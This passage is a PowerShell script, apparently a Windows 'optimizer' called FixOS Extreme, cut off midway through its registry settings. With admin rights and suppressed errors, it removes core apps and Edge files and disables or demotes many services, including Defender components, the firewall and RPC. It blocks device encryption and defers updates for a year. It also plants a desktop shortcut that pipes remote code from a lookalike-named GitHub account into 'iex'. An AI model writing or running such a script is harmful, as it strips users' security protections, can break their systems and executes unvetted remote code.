param([switch]$Install,[switch]$Silent)

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "This script requires Administrator privileges!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Please right-click PowerShell and select 'Run as Administrator', then run this script again." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Press Enter to exit..." -ForegroundColor Gray
    $null = Read-Host
    exit
}

$fullscreenCode = @'
[DllImport("user32.dll")]
public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]
public static extern bool SetForegroundWindow(IntPtr hWnd);
public const byte VK_F11 = 0x7A;
public const uint KEYEVENTF_EXTENDEDKEY = 0x0001;
public const uint KEYEVENTF_KEYUP = 0x0002;
'@

try { Add-Type -MemberDefinition $fullscreenCode -Name KeyboardAPI -Namespace Win32 } catch {}

try {
    Start-Sleep -Milliseconds 500
    $windowHandle = [Win32.KeyboardAPI]::GetForegroundWindow()
    if ($windowHandle -ne [IntPtr]::Zero) {
        [Win32.KeyboardAPI]::SetForegroundWindow($windowHandle)
        Start-Sleep -Milliseconds 100
        [Win32.KeyboardAPI]::keybd_event([Win32.KeyboardAPI]::VK_F11, 0, [Win32.KeyboardAPI]::KEYEVENTF_EXTENDEDKEY, 0)
        Start-Sleep -Milliseconds 50
        [Win32.KeyboardAPI]::keybd_event([Win32.KeyboardAPI]::VK_F11, 0, [Win32.KeyboardAPI]::KEYEVENTF_KEYUP, 0)
        Start-Sleep -Milliseconds 500
    }
} catch {}

try {
    $maxWidth = $Host.UI.RawUI.MaxWindowSize.Width
    $maxHeight = $Host.UI.RawUI.MaxWindowSize.Height
    $Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size($maxWidth, $maxHeight)
    $Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size($maxWidth, 9999)
} catch {
    $Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(120, 50)
    $Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(120, 9999)
}

function Show-Menu {
    Clear-Host
    $bannerLines = @(
        " ███████╗██╗██╗  ██╗  ██████╗ ███████╗ ",
        " ██╔════╝██║╚██╗██╔╝ ██╔═══██╗██╔════╝ ", 
        " █████╗  ██║ ╚███╔╝  ██║   ██║███████╗ ",
        " ██╔══╝  ██║ ██╔██╗  ██║   ██║╚════██║ ",
        " ██║     ██║██╔╝ ██╗ ╚██████╔╝███████║ ",
        " ╚═╝     ╚═╝╚═╝  ╚═╝  ╚═════╝ ╚══════╝ ",
        "                                       ",
        "                                       ",
        " © 2026 Devspace. All rights reserved. ",
        "                                       "
    )

    function Write-CenteredLine {
        param ([string]$Text,[ConsoleColor]$ForegroundColor = $Host.UI.RawUI.ForegroundColor)
        try {
            $width = $Host.UI.RawUI.WindowSize.Width
            if ($width -eq 0) { $width = 80 }
            $padded = $Text.PadLeft(([int](($width + $Text.Length)/2)))
            Write-Host $padded -ForegroundColor $ForegroundColor
        } catch { Write-Host $Text -ForegroundColor $ForegroundColor }
    }

    Write-Host ""
    foreach ($line in $bannerLines) { Write-CenteredLine -Text $line }
    Write-CenteredLine -Text ""; Write-CenteredLine -Text ""
    Write-CenteredLine -Text "[1] Install FixOS Extreme    [2] Learn More"
    Write-CenteredLine -Text ""; Write-CenteredLine -Text "[3] Exit"; Write-CenteredLine -Text ""
    $choice = Read-Host "Select an option"

    switch ($choice) {
        "1" { Install-FixOS }
        "2" { Start-Process "https://github.com/DeveIopmentSpace/FixOs"; Show-Menu }
        "3" { exit }
        default { Write-Host "Invalid selection..."; Start-Sleep -Seconds 2; Show-Menu }
    }
}

function Start-WindowsOptimization {
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Warning "Please run as Administrator"; return $false
    }

    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

    function Remove-AppxSafe {
        param([string]$AppName)
        try {
            Get-AppxPackage -Name $AppName -AllUsers -ErrorAction SilentlyContinue | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
            Get-AppxPackage -Name $AppName -ErrorAction SilentlyContinue | Remove-AppxPackage -ErrorAction SilentlyContinue
            Get-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue | Where-Object { $_.PackageName -like "*$AppName*" } | ForEach-Object {
                Remove-AppxProvisionedPackage -Online -PackageName $_.PackageName -ErrorAction SilentlyContinue
            }; return $true
        } catch { return $false }
    }

    function Set-RegistryValue {
        param([string]$Path, [string]$Name, [object]$Value, [string]$Type = "DWord")
        try {
            if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type $Type -Force; return $true
        } catch { return $false }
    }

    function Remove-RegistryKey {
        param([string]$Path)
        try { if (Test-Path $Path) { Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue } } catch {}
    }

    function Create-ToolboxShortcut {
        try {
            $desktopPath = [Environment]::GetFolderPath("Desktop")
            $shortcutPath = Join-Path $desktopPath "Toolbox.lnk"
            $toolboxUrl = "https://raw.githubusercontent.com/DeveIopmentSpace/FixOs/dev/Toolbox/src/Toolbox.ps1"
            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut($shortcutPath)
            $Shortcut.TargetPath = "wt.exe"
            $Shortcut.Arguments = "-p `"Windows PowerShell`" -d `"$env:USERPROFILE`" powershell -Command `"irm '$toolboxUrl' | iex`""
            $Shortcut.WorkingDirectory = "$env:USERPROFILE"
            $Shortcut.Description = "FixOs Toolbox"
            $Shortcut.IconLocation = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe,0"
            $Shortcut.Save(); return $true
        } catch { return $false }
    }

    function Remove-CrapApps {
        $appsToRemove = @(
            "Microsoft.549981C3F5F10", "Microsoft.BingNews", "Microsoft.BingWeather", "Microsoft.BingSports", 
            "Microsoft.BingFinance", "Microsoft.BingFoodAndDrink", "Microsoft.BingHealthAndFitness", "Microsoft.BingTravel",
            "Microsoft.GetHelp", "Microsoft.Getstarted", "Microsoft.Messaging", "Microsoft.Microsoft3DViewer",
            "Microsoft.MicrosoftOfficeHub", "Microsoft.MicrosoftSolitaireCollection", "Microsoft.MixedReality.Portal",
            "Microsoft.Office.OneNote", "Microsoft.OneConnect", "Microsoft.People", "Microsoft.Print3D",
            "Microsoft.SkypeApp", "Microsoft.Wallet", "Microsoft.WindowsAlarms", "Microsoft.WindowsCamera",
            "Microsoft.WindowsCommunicationsApps", "Microsoft.WindowsFeedbackHub", "Microsoft.WindowsMaps",
            "Microsoft.WindowsSoundRecorder", "Microsoft.Xbox.TCUI", "Microsoft.XboxApp", "Microsoft.XboxGameCallableUI",
            "Microsoft.XboxGamingOverlay", "Microsoft.XboxIdentityProvider", "Microsoft.XboxSpeechToTextOverlay",
            "Microsoft.YourPhone", "Microsoft.ZuneMusic", "Microsoft.ZuneVideo", "Microsoft.Advertising.Xaml",
            "Microsoft.Todos", "Microsoft.PowerAutomateDesktop", "Microsoft.Windows.DevHome", "Clipchamp.Clipchamp",
            "Microsoft.Copilot", "Microsoft.WindowsCopilot", "Microsoft.LinkedIn", "Microsoft.Teams", "Microsoft.People",
            "Microsoft.MixedReality", "Microsoft.QuickAssist", "Microsoft.OutlookForWindows", "microsoft.windowscommunicationsapps",
            "Microsoft.WindowsStore", "Microsoft.StorePurchaseApp", "Microsoft.Widgets", "Microsoft.Windows.Photos",
            "Microsoft.Paint", "Microsoft.MSPaint", "Microsoft.WindowsCalculator", "Microsoft.WindowsNotepad",
            "Microsoft.MicrosoftStickyNotes", "Microsoft.People", "Microsoft.WindowsFeedbackHub", "Microsoft.Getstarted",
            "Microsoft.MicrosoftEdge", "Microsoft.MicrosoftEdge.Stable", "MicrosoftEdge", "Microsoft.WebMediaExtensions",
            "Microsoft.WebpImageExtension", "Microsoft.HEIFImageExtension", "Microsoft.VP9VideoExtensions",
            "Microsoft.RawImageExtension", "Microsoft.HEVCVideoExtension", "Microsoft.DolbyAudioExtensions",
            "Microsoft.DolbyVisionExtensions", "Microsoft.MPEG2VideoExtension"
        )

        foreach ($app in $appsToRemove) { try { Remove-AppxSafe -AppName $app } catch {} }
    }

    function Optimize-Services-Extreme {
        try {
            $servicesToDisable = @(
                'DiagTrack', 'dmwappushservice', 'WSearch', 'XboxGipSvc', 'XblAuthManager', 'XblGameSave', 
                'XboxNetApiSvc', 'OneSyncSvc', 'PcaSvc', 'WpcMonSvc', 'wisvc', 'RetailDemo', 'MessagingService',
                'lfsvc', 'MapsBroker', 'PimIndexMaintenanceSvc', 'UnistoreSvc', 'UserDataSvc', 'WpnService',
                'WpnUserService', 'WdNisSvc', 'Sense', 'wscsvc', 'SysMain', 'BcastDVRUserService', 'CaptureService',
                'cbdhsvc', 'ConsentUxUserSvc', 'CredentialEnrollmentManagerUserSvc', 'DeviceAssociationBrokerSvc',
                'DevicePickerUserSvc', 'DevicesFlowUserSvc', 'NPSMSvc', 'P9RdrService', 'PenService',
                'PrintWorkflowUserSvc', 'UdkUserSvc', 'autotimesvc', 'tzautoupdate', 'shpamsvc', 'PhoneSvc',
                'RemoteRegistry', 'RemoteAccess', 'SessionEnv', 'TermService', 'UmRdpService', 'SharedAccess',
                'hidserv', 'WbioSrvc', 'FrameServer', 'StiSvc', 'WiaRpc', 'icssvc', 'WlanSvc', 'WwanSvc',
                'Spooler', 'AeLookupSvc', 'ALG', 'AppIDSvc', 'AppMgmt', 'AppReadiness', 'AppVClient', 'AppXSvc',
                'AssignedAccessManagerSvc', 'AxInstSV', 'BDESVC', 'BTAGService', 'BthAvctpSvc', 'BthHFSrv',
                'bthserv', 'CertPropSvc', 'DcpSvc', 'DevQueryBroker', 'DeviceInstall', 'DmEnrollmentSvc', 'DsSvc',
                'DsmSvc', 'Eaphost', 'EntAppSvc', 'FDResPub', 'Fax', 'fhsvc', 'GraphicsPerfSvc', 'HomeGroupListener',
                'HomeGroupProvider', 'HvHost', 'IEEtwCollectorService', 'IKEEXT', 'InstallService', 'InventorySvc',
                'IpxlatCfgSvc', 'KtmRm', 'LicenseManager', 'LxpSvc', 'MSiSCSI', 'MixedRealityOpenXRSvc',
                'MsKeyboardFilter', 'NaturalAuthentication', 'NcaSvc', 'NcbService', 'NcdAutoSetup', 'NetSetupSvc',
                'NetTcpPortSharing', 'NgcCtnrSvc', 'NgcSvc', 'PNRPAutoReg', 'PNRPsvc', 'PeerDistSvc', 'PerfHost',
                'PrintNotify', 'PushToInstall', 'QWAVE', 'RasAuto', 'RasMan', 'RmSvc', 'SCPolicySvc', 'SCardSvr',
                'SDRSVC', 'SEMgrSvc', 'SNMPTRAP', 'SSDPSRV', 'ScDeviceEnum', 'SensorDataService', 'SensorService',
                'SensrSvc', 'SharedRealitySvc', 'SmsRouter', 'SstpSvc', 'TabletInputService', 'TapiSrv',
                'TextInputManagementService', 'TieringEngineService', 'TimeBrokerSvc', 'TokenBroker',
                'TroubleshootingSvc', 'UI0Detect', 'UevAgentService', 'VacSvc', 'VSS', 'W32Time', 'WEPHOSTSVC',
                'WFDSConMgrSvc', 'WMPNetworkSvc', 'WManSvc', 'WPDBusEnum', 'WSService', 'WaaSMedicSvc',
                'WalletService', 'WarpJITSvc', 'WcsPlugInService', 'WdiServiceHost', 'WdiSystemHost', 'WebClient',
                'Wecsvc', 'WerSvc', 'WinHttpAutoProxySvc', 'WinRM', 'camsvc', 'cloudidsvc', 'dcsvc', 'defragsvc',
                'diagnosticshub.standardcollector.service', 'diagsvc', 'dot3svc', 'embeddedmode', 'fdPHost',
                'lltdsvc', 'lmhosts', 'p2pimsvc', 'p2psvc', 'perceptionsimulation', 'pla', 'seclogon', 'smphost',
                'spectrum', 'sppsvc', 'ssh-agent', 'svsvc', 'swprv', 'uhssvc', 'upnphost', 'vds', 'vmicguestinterface',
                'vmicheartbeat', 'vmickvpexchange', 'vmicrdv', 'vmicshutdown', 'vmictimesync', 'vmicvmsession',
                'vmicvss', 'AJRouter', 'FontCache', 'Themes', 'edgeupdate', 'edgeupdatem', 'MicrosoftEdgeElevationService'
            )

            $servicesToManual = @(
                'BITS', 'wuauserv', 'DoSvc', 'UsoSvc', 'Schedule', 'TrustedInstaller', 'AudioEndpointBuilder',
                'Audiosrv', 'CDPSvc', 'CDPUserSvc', 'CoreMessagingRegistrar', 'StateRepository', 'UserManager',
                'VaultSvc', 'Winmgmt', 'Wcmsvc', 'nsi', 'iphlpsvc', 'Dnscache', 'Dhcp', 'EventLog', 'EventSystem',
                'gpsvc', 'ProfSvc', 'Power', 'DcomLaunch', 'RpcSs', 'RpcEptMapper', 'SamSs', 'LanmanServer',
                'LanmanWorkstation', 'PlugPlay', 'SENS', 'ShellHWDetection', 'TrkWks', 'tiledatamodelsvc',
                'BrokerInfrastructure', 'SystemEventsBroker', 'CryptSvc', 'DPS', 'MpsSvc', 'mpssvc', 'BFE',
                'KeyIso', 'Netlogon', 'NlaSvc', 'PolicyAgent', 'SgrmBroker', 'WinDefend', 'SecurityHealthService'
            )

            foreach ($serviceName in $servicesToDisable) {
                try {
                    $svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
                    if ($svc) {
                        if ($svc.Status -eq 'Running') {
                            Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
                            Start-Sleep -Milliseconds 200
                        }
                        Set-Service -Name $serviceName -StartupType Disabled -ErrorAction SilentlyContinue
                    }
                } catch {}
            }

            foreach ($serviceName in $servicesToManual) {
                try {
                    $svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
                    if ($svc) { Set-Service -Name $serviceName -StartupType Manual -ErrorAction SilentlyContinue }
                } catch {}
            }

        } catch {}
    }

    function Remove-EdgeCompletely {
        try {
            Stop-Process -Name "*edge*" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            $edgeServices = @('edgeupdate', 'edgeupdatem', 'MicrosoftEdgeElevationService')
            foreach ($svc in $edgeServices) {
                $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
                if ($s) {
                    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Milliseconds 500
                    Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
                }
            }
            $edgePaths = @(
                "C:\Program Files (x86)\Microsoft\Edge", "C:\Program Files (x86)\Microsoft\EdgeWebView",
                "C:\Program Files (x86)\Microsoft\EdgeUpdate", "C:\Program Files (x86)\Microsoft\EdgeCore",
                "C:\Windows\System32\Microsoft-Edge-Webview", "C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe",
                "C:\Windows\SystemApps\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe", "$env:LOCALAPPDATA\Microsoft\Edge",
                "$env:ProgramData\Microsoft\Edge"
            )
            foreach ($path in $edgePaths) { if (Test-Path $path) { Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue } }
            Remove-RegistryKey -Path "HKLM:\SOFTWARE\Microsoft\Edge"
            Remove-RegistryKey -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Edge"
            Remove-RegistryKey -Path "HKLM:\SOFTWARE\Microsoft\EdgeUpdate"
            Remove-RegistryKey -Path "HKCU:\SOFTWARE\Microsoft\Edge"
            Remove-RegistryKey -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
        } catch {}
    }

    function Remove-OneDrive {
        try {
            Stop-Process -Name "OneDrive" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
            $OneDriveSetup32 = "$env:SystemRoot\System32\OneDriveSetup.exe"
            $OneDriveSetup64 = "$env:SystemRoot\SysWOW64\OneDriveSetup.exe"
            if (Test-Path $OneDriveSetup32) { Start-Process $OneDriveSetup32 "/uninstall" -Wait -ErrorAction SilentlyContinue }
            if (Test-Path $OneDriveSetup64) { Start-Process $OneDriveSetup64 "/uninstall" -Wait -ErrorAction SilentlyContinue }
            Start-Sleep -Seconds 2
            $oneDriveDirs = @(
                "$env:SystemDrive\OneDriveTemp", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\AppData\Local\Microsoft\OneDrive",
                "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk", "$env:ProgramData\Microsoft OneDrive",
                "$env:LOCALAPPDATA\Microsoft\OneDrive", "$env:ProgramFiles\Microsoft OneDrive", "$env:ProgramFiles(x86)\Microsoft OneDrive",
                "$env:SystemDrive\ProgramData\Microsoft OneDrive", "$env:USERPROFILE\AppData\Roaming\Microsoft\OneDrive"
            )
            foreach ($dir in $oneDriveDirs) { if (Test-Path $dir) { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue } }
            Remove-RegistryKey -Path "HKCU:\Software\Microsoft\OneDrive"
            Remove-RegistryKey -Path "HKLM:\SOFTWARE\Microsoft\OneDrive"
            Remove-RegistryKey -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\OneDrive"
            Get-ScheduledTask | Where-Object {$_.TaskName -like "*OneDrive*"} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch {}
    }

    function Remove-Teams {
        try {
            Stop-Process -Name "Teams" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
            Get-AppxPackage -AllUsers -Name "*Teams*" | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
            Get-AppxProvisionedPackage -Online | Where-Object DisplayName -like "*Teams*" | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue
            $teamsDirs = @(
                "$env:LOCALAPPDATA\Microsoft\Teams", "$env:APPDATA\Microsoft\Teams", "$env:APPDATA\Teams",
                "$env:ProgramData\Microsoft Teams", "$env:USERPROFILE\AppData\Local\Microsoft\Teams",
                "$env:USERPROFILE\AppData\Roaming\Microsoft\Teams", "$env:ProgramFiles\Teams Installer",
                "$env:ProgramFiles(x86)\Teams Installer"
            )
            foreach ($dir in $teamsDirs) { if (Test-Path $dir) { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue } }
        } catch {}
    }

    function Remove-Xbox {
        try {
            $xboxApps = @(
                "Microsoft.Xbox.TCUI", "Microsoft.XboxApp", "Microsoft.XboxGameCallableUI",
                "Microsoft.XboxGamingOverlay", "Microsoft.XboxIdentityProvider",
                "Microsoft.XboxSpeechToTextOverlay", "Microsoft.GamingApp"
            )
            foreach ($app in $xboxApps) { Remove-AppxSafe -AppName $app }
        } catch {}
    }

    function Disable-Telemetry {
        try {
            $telemetryRegistries = @(
                @{Path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection"; Name = "AllowTelemetry"; Value = 0}
                @{Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection"; Name = "AllowTelemetry"; Value = 0}
                @{Path = "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection"; Name = "AllowTelemetry"; Value = 0}
            )
            foreach ($reg in $telemetryRegistries) { Set-RegistryValue -Path $reg.Path -Name $reg.Name -Value $reg.Value }
        } catch {}
    }

    function Set-Wallpaper {
        try {
            $wallUrl = 'https://github.com/DeveIopmentSpace/FixOs/blob/dev/assets/wallpaper-dev.png?raw=true'
            $wallPath = Join-Path $env:PUBLIC 'FixOs-Wallpaper.png'
            Invoke-WebRequest -Uri $wallUrl -OutFile $wallPath -ErrorAction SilentlyContinue
            if (Test-Path $wallPath) {
                Add-Type @"
using System; using System.Runtime.InteropServices;
public class Wallpaper { [DllImport("user32.dll", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }
"@ -ErrorAction SilentlyContinue
                [Wallpaper]::SystemParametersInfo(20, 0, $wallPath, 0x01 -bor 0x02)
            }
        } catch {}
    }

    Remove-CrapApps
    Optimize-Services-Extreme
    Remove-EdgeCompletely
    Remove-OneDrive
    Remove-Teams
    Remove-Xbox
    Disable-Telemetry
    Set-Wallpaper
    Create-ToolboxShortcut
    
    return $true
}

function Apply-RegistryTweaks {
    
    function Set-RegistryForce {
        param([string]$Path,[string]$Name,[string]$Type,[string]$Value,[string]$Action = "Add")
        try {
            if ($Action -eq "Add") {
                if (-not (Test-Path $Path)) { New-Item -Path $Path -Force -ErrorAction SilentlyContinue | Out-Null }
                New-ItemProperty -Path $Path -Name $Name -PropertyType $Type -Value $Value -Force -ErrorAction SilentlyContinue | Out-Null
            } elseif ($Action -eq "Delete") { Remove-ItemProperty -Path $Path -Name $Name -Force -ErrorAction SilentlyContinue | Out-Null }
        } catch {}
    }

    function Remove-RegistryKeyForce {
        param([string]$Path)
        try { if (Test-Path $Path) { Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue | Out-Null } } catch {}
    }

    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue | Out-Null

    $registrySettings = @(
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"; N="DisableWindowsSpotlightOnLockScreen"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"; N="DisableWindowsConsumerFeatures"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"; N="DisableWindowsSpotlightActiveUser"; V=1}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Communications"; N="ConfigureChatAutoInstall"; V=0}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Chat"; N="ChatIcon"; V=3}
        @{P="HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"; N="LongPathsEnabled"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Dsh"; N="AllowNewsAndInterests"; V=0}
        @{P="HKLM:\SYSTEM\CurrentControlSet\Control\BitLocker"; N="PreventDeviceEncryption"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"; N="AUOptions"; V=3}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"; N="DeferFeatureUpdates"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"; N="DeferFeatureUpdatesPeriodInDays"; V=365}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"; N="DeferQualityUpdates"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"; N="DeferQualityUpdatesPeriodInDays"; V=365}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"; N="TargetReleaseVersion"; V=1; T="String"; V="22H2"}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"; N="ProductVersion"; T="String"; V="Windows 10"}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search"; N="AllowCortana"; V=0}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"; N="EnableActivityFeed"; V=0}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"; N="PublishUserActivities"; V=0}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"; N="UploadUserActivities"; V=0}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"; N="Value"; T="String"; V="Deny"}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\WindowsInkWorkspace"; N="AllowWindowsInkWorkspace"; V=0}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection"; N="DoNotShowFeedbackNotifications"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo"; N="DisabledByGroupPolicy"; V=1}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"; N="Disabled"; V=1}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config"; N="DODownloadMode"; V=0}
        @{P="HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance"; N="fAllowToGetHelp"; V=0}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching"; N="SearchOrderConfig"; V=1}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"; N="SystemResponsiveness"; V=0}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"; N="NetworkThrottlingIndex"; V=10}
        @{P="HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"; N="ClearPageFileAtShutdown"; V=0}
        @{P="HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"; N="IRPStackSize"; V=30}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"; N="GPU Priority"; V=8}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"; N="Priority"; V=6}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"; N="Scheduling Category"; T="String"; V="High"}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"; N="HideSCAMeetNow"; V=1}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\StorageSense\Parameters\StoragePolicy"; N="01"; V=0}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\GameDVR"; N="AllowGameDVR"; V=0}
        @{P="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; N="DisableAutomaticRestartSignOn"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\OneDrive"; N="KFMBlockOptIn"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive"; N="DisableFileSyncNGSC"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\PushToInstall"; N="DisablePushToInstall"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"; N="DisableConsumerAccountStateContent"; V=1}
        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent"; N="DisableCloudOptimizedContent"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="ContentDeliveryAllowed"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="FeatureManagementEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="OEMPreInstalledAppsEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="PreInstalledAppsEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="PreInstalledAppsEverEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="SilentInstalledAppsEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="RotatingLockScreenEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="RotatingLockScreenOverlayEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="SoftLandingEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"; N="SubscribedContentEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy"; N="TailoredExperiencesWithDiagnosticDataEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy"; N="IsMiEnabled"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy"; N="HasAccepted"; V=0}
        @{P="HKCU:\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot"; N="TurnOffWindowsCopilot"; V=1}
        @{P="HKCU:\SOFTWARE\Microsoft\Notepad"; N="ShowStoreBanner"; V=0}
        @{P="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="TaskbarAl"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Search"; N="SearchboxTaskbarMode"; V=0}
        @{P="HKCU:\Software\Policies\Microsoft\Windows\Explorer"; N="HideRecentlyAddedApps"; V=1}
        @{P="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="Start_IrisRecommendations"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People"; N="PeopleBand"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"; N="ShowTaskViewButton"; V=0}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Feeds"; N="ShellFeedsTaskbarViewMode"; V=2}
        @{P="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Feeds"; N="ShellFeedsEnabled"; V=0}
